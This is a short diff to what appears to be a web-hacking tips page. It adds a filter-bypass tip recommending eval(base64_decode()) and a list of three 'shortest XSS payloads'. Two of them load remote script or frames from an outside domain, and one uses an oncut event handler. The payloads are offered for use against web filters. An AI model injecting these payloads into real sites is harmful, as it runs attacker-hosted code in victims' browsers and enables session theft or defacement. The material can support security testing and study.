@@ -10,4 +10,14 @@ Example: https://www.openbugbounty.org/reports/1211008/
 
 <h1>Bypassing XSS Filters:</h1><br>
 
-<b>1. Remember that you can always use eval(base64_decode()) to anytime you can to Byass any Filters.
+<b>1. Remember that you can always use eval(base64_decode()) to anytime you can to Byass any Filters.</b>
+<br>
+Top 3 Shortest XSS Payloads!
+<br>
+1. <script/src=//⑮.rs
+<br>
+2. <x/oncut=alert(1)>a
+<br>
+3. <iframe src=//⑮.rs>
+<br>
+Twitter: JacksonHHax
